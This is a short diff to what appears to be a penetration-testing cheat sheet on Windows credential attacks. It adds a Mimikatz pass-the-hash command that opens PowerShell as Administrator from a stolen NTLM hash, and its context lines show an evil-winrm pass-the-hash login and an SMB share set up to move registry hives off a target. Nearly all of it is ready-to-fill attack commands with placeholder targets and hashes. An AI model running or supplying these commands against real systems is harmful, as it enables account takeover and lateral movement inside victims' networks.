@@ -50,6 +50,10 @@
 
     evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'
 
+#### Mimikatz
+
+    sekurlsa:pth /user:Administrator /ntlm:NTLM_HASH /domain:DOMAIN /run:powershell.exe
+
 ## Alternate Method to transfer the Hives: reg.py  remotely on Linux
 
     python smbserver.py -smb2support share /tmp
